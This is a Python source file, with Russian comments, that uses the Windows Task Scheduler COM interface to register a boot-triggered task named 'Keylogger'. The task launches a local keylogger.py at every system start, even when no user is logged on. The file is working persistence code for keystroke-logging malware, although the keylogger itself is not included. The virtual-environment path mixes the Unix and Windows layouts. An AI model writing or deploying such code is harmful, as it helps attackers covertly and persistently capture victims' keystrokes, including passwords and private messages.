import os
from win32com.client import Dispatch
import os

# Получить текущую директорию
current_directory = os.getcwd()
def create_task(task_name, python_path, script_path):
    # Получаем путь к планировщику задач
    scheduler = Dispatch('Schedule.Service')
    scheduler.Connect()
    
    # Подключаемся к корневой папке планировщика
    root_folder = scheduler.GetFolder('\\')
    
    # Создаём новую задачу
    task_definition = scheduler.NewTask(0)

    # Устанавливаем настройки задачи
    task_definition.RegistrationInfo.Description = f'Автозапуск для {script_path}'
    task_definition.Principal.LogonType = 3  # Run whether user is logged on or not

    # Устанавливаем триггер запуска при старте системы
    triggers = task_definition.Triggers
    trigger = triggers.Create(2)  # 2 = TASK_TRIGGER_BOOT

    # Устанавливаем действие для выполнения скрипта
    actions = task_definition.Actions
    action = actions.Create(0)  # 0 = TASK_ACTION_EXEC
    action.Path = python_path
    action.Arguments = f'"{script_path}"'

    # Устанавливаем настройки задачи
    settings = task_definition.Settings
    settings.Enabled = True
    settings.StartWhenAvailable = True
    settings.Hidden = False

    # Добавляем задачу в планировщик
    task_path = f'\\{task_name}'
    root_folder.RegisterTaskDefinition(
        task_path,
        task_definition,
        6,  # TASK_CREATE_OR_UPDATE
        None,  # UserId
        None,  # Password
        0,     # TASK_LOGON_INTERACTIVE_TOKEN
        None   # Sddl
    )
    print(f"Задача '{task_name}' успешно создана!")

if __name__ == "__main__":
    # Укажите имя задачи, путь к Python и скрипту
    task_name = "Keylogger"
    python_path = current_directory + r"\venv\bin\python3.exe"  # Укажите путь к python.exe
    script_path = current_directory + r"\keylogger.py"   # Укажите путь к вашему скрипту

    # Проверяем, что файлы существуют
    if not os.path.exists(python_path):
        print(f"Ошибка: Python не найден по пути {python_path}")
    elif not os.path.exists(script_path):
        print(f"Ошибка: Скрипт не найден по пути {script_path}")
    else:
        create_task(task_name, python_path, script_path)
